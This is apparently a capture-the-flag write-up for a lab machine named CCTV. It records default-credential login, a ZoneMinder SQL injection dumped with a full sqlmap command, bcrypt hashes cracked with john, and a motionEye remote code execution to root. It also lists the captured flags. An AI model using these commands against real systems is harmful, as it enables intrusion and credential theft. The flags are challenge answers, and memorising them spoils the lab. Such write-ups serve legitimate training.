# CCTV

## Writeup:
A quick nmap scan reveals two ports open, those being `port 22/ssh`, and `port 80/http`.
The open `http` port reveals the domain name, `cctv.htb` which I add to `/etc/hosts`.
The page itself is largely static, but a staff login endpoint is available. 
I try the credentials `admin:admin`, which immediately works. 
This leads to a `zoneminder` application, with the version number `v1.37.63`

An options tab lists the following users:
- `admin*`
- `mark`
- `superadmin`


The version of `zoneminder` is vulnerable to `CVE-2024-51482` (see submodule).
This reveals a `zm` database, which contains a couple tables, one of which being user.
```
+------------+
| Username   |
+------------+
| admin      |
| mark       |
| superadmin |
+------------+
```

Passwords can be dumped like so:
```
sqlmap -u "http://cctv.htb/zm/index.php?view=request&request=event&action=removetag&tid=1" \
        --cookie="ZMSESSID=<session_id>" \
        -p tid --dbms=mysql --batch -D zm -T Users -C "Password" --dump
```

Resulting in the accquisition of the following hashes:
```
+--------------------------------------------------------------+
| Password                                                     |
+--------------------------------------------------------------+
| $2y$10$cmytVWFRnt1XfqsItsJRVe/ApxWxcIFQcURnm5N.rhlULwM0jrtbm |
| $2y$10$prZGnazejKcuTv5bKNexXOgLyQaok0hq07LW7AJ/QNqZolbXKfFG. |
| $2y$10$t5z8uIT.n9uCdHCNidcLf.39T1Ui9nrlCkdXrzJMnJgkTiAvRUM6m |
+--------------------------------------------------------------+
```

Using `john` I cracked the hash belonging to `mark`, which resulted in the password `opensesame`.
Trying to login as `mark` via ssh with the `opensesame` password works, and thus we have shell access.

Upon logging in I immediately notice something odd, running `ps aux` reveals only two processes.
```
USER         PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
mark        3267  0.0  0.1   8648  5644 pts/0    Ss   12:11   0:00 -bash
mark        3529  0.0  0.1  10884  4488 pts/0    R+   12:36   0:00 ps aux
```

After a bit of searching I discover that motionEye version `0.43.1b4` is running on the host.
I find the password to the webui hosted over `port 8765` at `/etc/motioneye/motion.conf`.
- `# @admin_password 989c5a8ee87a0e9521ec81a79187d162109282f0`

This version of motionEye is vulnerable to remote code execution (see submodule).
Exploiting this grants command execution as root, from there I grab the user flag in `/home/sa_mark/user.txt` and the root flag in `/root/root.txt`.

- `user.txt: 12f1d1ac58e888e5c4f4f850c0df55ff`
- `root.txt: 7a5ef408462ae073cfc8fcf7e3ea6f51`

## Useful Commands:
- `john hashes.txt --wordlist=~/SecLists/Passwords/Leaked-Databases/rockyou.txt`
